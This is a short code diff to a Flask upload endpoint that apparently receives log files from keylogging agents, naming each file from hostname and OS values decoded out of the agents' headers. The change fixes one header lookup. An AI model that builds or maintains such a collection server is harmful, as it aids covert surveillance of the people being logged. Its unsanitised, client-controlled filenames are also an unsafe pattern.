@@ -15,7 +15,7 @@ klog_server.config['KLOG_UPLOAD_DIR'] = KLOG_UPLOAD_DIR
 def klog_collect():
 	if request.method == 'POST':
 		klog_file =  request.files["bbe02f946d5455d74616fc9777557c22"]
-		getid_headers = base64.b64decode(request.headers.get('Nn')) + b'_' + base64.b64decode(request.headers.getitem('Sn'))
+		getid_headers = base64.b64decode(request.headers.get('Nn')) + b'_' + base64.b64decode(request.headers.get('Sn'))
 		##Filename format is as follows <hostname>_<OS>_<remote_addr>_<timestamp>
 		##hostname/OS are both from the agents http headers
 		##Remote Addr is logged from what flask recives from the request obj
